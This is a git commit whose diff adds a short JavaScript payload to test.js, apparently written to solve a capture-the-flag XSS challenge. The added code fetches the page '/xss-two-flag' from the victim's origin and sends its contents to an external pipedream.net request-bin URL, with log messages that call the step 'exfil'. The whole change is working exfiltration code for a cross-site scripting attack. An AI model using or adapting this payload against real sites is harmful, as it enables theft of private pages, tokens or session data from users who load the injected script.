8d38bba60cca629b92f96655ff8606819cd6f0fd
Geen Caille L. Malaguena <geencaille2@gmail.com>
2026-03-21 16:15:51 +0800

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,7 @@
-
+fetch('/xss-two-flag')
+  .then(r => r.text())
+  .then(flag => {
+    fetch('https://eonai2qe036n6eu.m.pipedream.net?flag=' + encodeURIComponent(flag))
+      .catch(e => console.log('exfil error', e));
+  })
+  .catch(e => console.log('fetch error', e));
